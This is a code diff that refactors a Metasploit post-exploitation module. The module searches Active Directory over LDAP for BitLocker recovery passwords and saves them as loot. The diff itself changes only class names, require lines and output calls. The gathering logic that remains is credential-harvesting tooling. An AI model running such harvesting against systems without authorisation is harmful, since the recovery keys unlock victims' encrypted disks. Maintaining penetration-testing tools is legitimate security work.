@@ -1,13 +1,10 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'rex'
-require 'msf/core'
-require 'msf/core/auxiliary/report'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::LDAP
 
@@ -32,7 +29,7 @@ class Metasploit3 < Msf::Post
       OptBool.new('STORE_LOOT', [true, 'Store file in loot.', true]),
       OptString.new('FIELDS', [true, 'FIELDS to retrieve.', 'distinguishedName,msFVE-RecoveryPassword']),
       OptString.new('FILTER', [true, 'Search filter.', '(objectClass=msFVE-RecoveryInformation)'])
-    ], self.class)
+    ])
   end
 
   def run
@@ -53,7 +50,7 @@ class Metasploit3 < Msf::Post
     end
 
     # Results table holds raw string data
-    results_table = Rex::Ui::Text::Table.new(
+    results_table = Rex::Text::Table.new(
       'Header'     => 'BitLocker Recovery Passwords',
       'Indent'     => 1,
       'SortIndex'  => -1,
@@ -75,7 +72,7 @@ class Metasploit3 < Msf::Post
 
     if datastore['STORE_LOOT']
       stored_path = store_loot('bitlocker.recovery', 'text/plain', session, results_table.to_csv)
-      print_status("Results saved to: #{stored_path}")
+      print_good("Results saved to: #{stored_path}")
     end
   end
 end
